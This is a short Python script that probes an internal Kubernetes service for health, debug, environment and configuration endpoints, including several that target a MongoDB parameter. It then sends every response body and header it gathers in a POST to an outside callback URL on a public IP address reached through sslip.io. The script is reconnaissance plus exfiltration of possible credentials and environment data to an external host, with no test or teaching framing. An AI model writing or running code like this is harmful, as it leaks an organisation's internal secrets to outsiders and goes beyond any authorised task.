#!/usr/bin/env python3
import urllib.request,urllib.error,json,time
h='http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local'
paths=['/','/health','/ready','/version','/metrics','/openapi.json','/docs','/swagger.json','/api','/api/','/get_param','/get_param?param_key=MONGODB','/params','/params/MONGODB','/parameter/MONGODB','/get_param/MONGODB','/debug','/routes','/actuator','/actuator/health','/actuator/env','/config','/config/MONGODB','/v1/params','/v1/get_param']
out=[]
for p in paths:
 rec={'path':p}
 try:
  with urllib.request.urlopen(urllib.request.Request(h+p,headers={'Accept':'application/json'}),timeout=2) as r:
   b=r.read(10000); rec.update(status=r.status,body=b.decode('utf-8','replace'),headers=dict(r.headers))
 except urllib.error.HTTPError as e:
  b=e.read(10000); rec.update(status=e.code,body=b.decode('utf-8','replace'),headers=dict(e.headers))
 except Exception as e: rec['error']=repr(e)
 out.append(rec); print(json.dumps(rec,separators=(',',':')))
raw=json.dumps({'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'cases':out},separators=(',',':')).encode()
req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-metaserve-surface2-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
try:
 with urllib.request.urlopen(req,timeout=30) as r: print('SINK',r.status,len(raw))
except Exception as e: print('SINKERR',repr(e),len(raw))
